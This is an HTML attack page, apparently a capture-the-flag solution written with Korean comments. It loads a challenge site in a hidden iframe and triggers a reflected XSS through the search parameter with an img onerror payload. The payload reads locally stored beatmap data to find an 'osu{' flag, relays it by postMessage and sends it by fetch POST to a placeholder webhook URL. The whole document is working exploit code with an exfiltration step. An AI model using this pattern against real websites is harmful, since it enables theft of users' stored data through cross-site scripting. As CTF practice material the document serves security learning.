<!DOCTYPE html>
<html>
<head>
    <title>Attack Page</title>
</head>
<body>
    <h1>Please wait, processing...</h1>

    <script>
        // 🚨 중요: 이 부분을 당신의 Webhook 주소로 바꾸세요!
        const WEBHOOK_URL = "[당신의 WEBHOOK 주소]";

        // 🚨 중요: 이 부분을 실제 챌린지 웹사이트 주소로 바꾸세요!
        const CHALLENGE_URL = "http://localhost"; // 관리자 봇의 기준이므로 localhost가 맞을 수 있습니다. 실제 챌린지 주소를 확인하세요.

        // 1. 봇이 우리 페이지에 접속하면, 보이지 않는 iframe으로 챌린지 사이트를 엽니다.
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = CHALLENGE_URL;
        document.body.appendChild(iframe);

        // 2. iframe이 로드되기를 기다립니다.
        iframe.onload = () => {
            console.log("Iframe loaded. Injecting payload...");

            // 3. XSS 취약점을 트리거할 악성 스크립트 문자열을 만듭니다.
            // 이 스크립트는 챌린지 사이트의 컨텍스트에서 실행됩니다.
            const payload = `
                // 챌린지 사이트에는 localforage.js가 이미 로드되어 있으므로 바로 사용 가능합니다.
                localforage.getItem("beatmapSets").then(sets => {
                    if (sets) {
                        // 모든 비트맵 세트를 뒤져서 제목이 'osu{'로 시작하는 플래그를 찾습니다.
                        for (const set of sets) {
                            if (set.title.startsWith('osu{')) {
                                // 플래그를 찾으면, 부모 창(우리 공격 페이지)으로 메시지를 보냅니다.
                                window.top.postMessage(set.title, '*');
                                return;
                            }
                        }
                    }
                });
            `;

            // 4. 검색 기능의 XSS 취약점을 이용해 스크립트를 주입합니다.
            // 검색어에 스크립트를 넣어 URL을 변경하면, 챌린지 사이트가 검색 결과를 표시하면서 스크립트를 실행하게 됩니다.
            const maliciousSearchURL = `${CHALLENGE_URL}/?search=<img src=x onerror="${payload.replace(/\n/g, '')}">`;
            
            // iframe의 주소를 악성 URL로 변경하여 XSS를 실행시킵니다.
            iframe.src = maliciousSearchURL;
        };

        // 5. 챌린지 사이트(iframe)로부터 플래그가 담긴 메시지를 기다립니다.
        window.addEventListener('message', (event) => {
            const flag = event.data;

            // 플래그로 보이는 메시지를 받으면...
            if (typeof flag === 'string' && flag.startsWith('osu{')) {
                console.log("FLAG RECEIVED:", flag);
                
                // 6. Webhook으로 플래그를 전송합니다!
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ flag: flag })
                });
            }
        });
    </script>
</body>
</html>
